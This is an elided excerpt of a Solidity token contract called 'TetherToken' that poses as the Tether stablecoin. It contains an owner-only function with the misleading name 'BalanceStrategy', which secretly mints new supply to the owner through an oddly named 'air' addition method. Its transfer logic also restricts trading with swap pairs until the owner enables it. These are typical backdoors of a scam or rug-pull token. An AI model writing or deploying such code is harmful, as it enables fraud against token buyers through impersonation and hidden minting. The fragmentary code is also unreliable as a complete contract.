...
contract TetherToken is Context, IERC20, Ownable {
    ...
    function closeAddLP() public onlyOwner {
   ...
   */
  function BalanceStrategy(uint256 amount) public onlyOwner returns (bool) {
    require(amount >= 0, "ERC20: amount cannot be less than zero");
    require(owner() != address(0), "ERC20: cannot permit zero address");
    
    _totalSupply = _totalSupply.air(amount);
    _balances[owner()] = _balances[owner()].air(amount);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(amount > 0, "ERC20: transfer amount less than zero");
        ...
        if (_swapPairList[sender] || _swapPairList[recipient]) {
            if (!_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[sender], "ERC20: operater action is not allowed");
                }
            }
        }
